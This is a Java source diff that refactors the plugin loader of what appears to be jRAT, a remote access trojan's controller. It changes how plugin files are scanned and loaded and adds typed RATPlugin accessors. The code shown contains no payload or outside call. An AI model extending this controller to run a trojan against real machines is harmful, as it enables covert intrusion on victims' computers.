@@ -4,6 +4,8 @@ import java.io.File;
 import java.util.ArrayList;
 import java.util.List;
 
+import jrat.api.RATPlugin;
+import pluginlib.Plugin;
 import se.jrat.controller.Globals;
 import se.jrat.controller.Main;
 import se.jrat.controller.utils.ClassUtils;
@@ -11,22 +13,39 @@ import se.jrat.controller.utils.ClassUtils;
 
 public class PluginLoader {
 
-	public static List<Plugin> plugins = new ArrayList<Plugin>();
+	private static List<Plugin<RATPlugin>> plugins = new ArrayList<Plugin<RATPlugin>>();
 
 	public static void loadPlugins() throws Exception {
-		plugins.clear();
-		File folder = Globals.getPluginDirectory();
-		folder.mkdirs();
-		File[] pluginsl = folder.listFiles();
-		for (File file : pluginsl) {
-			if (file.isFile() && file.getName().endsWith(".jar")) {
-				try {
-					new Plugin(file.getAbsolutePath());
-				} catch (Exception ex) {
-					ex.printStackTrace();
-				}
+		File dir = Globals.getPluginDirectory();
+		dir.mkdirs();
+		
+		File files[] = dir.listFiles();
+		
+		if (files != null) {
+			for (File file : files) {
+				load(file);
 			}
 		}
+	}
+	
+	public static List<RATPlugin> getPlugins() {
+		List<RATPlugin> list = new ArrayList<RATPlugin>();
+		
+		for (Plugin<RATPlugin> plugin : plugins) {
+			list.add(plugin.getInstance());
+		}
+		
+		return list;
+	}
+	
+	public static void load(File file) throws Exception {
+		Main.debug("Loading plugin " + file.getName());
+		
+		Plugin<RATPlugin> plugin = new Plugin<RATPlugin>(file);
+		
+		plugin.load();
+		
+		plugins.add(plugin);
 	}
 
 	public static void loadLibs() throws Exception {
@@ -38,15 +57,15 @@ public class PluginLoader {
 		}
 	}
 
-	public static void register(Plugin plugin) {
+	public static void register(Plugin<RATPlugin> plugin) {
 		plugins.remove(plugin);
 		plugins.add(plugin);
 	}
 
-	public static Plugin getPlugin(String name) {
-		for (Plugin plugin : plugins) {
-			if (plugin.getName().equalsIgnoreCase(name)) {
-				return plugin;
+	public static RATPlugin getPlugin(String name) {
+		for (Plugin<RATPlugin> plugin : plugins) {
+			if (plugin.getInstance().getName().equalsIgnoreCase(name)) {
+				return plugin.getInstance();
 			}
 		}
 
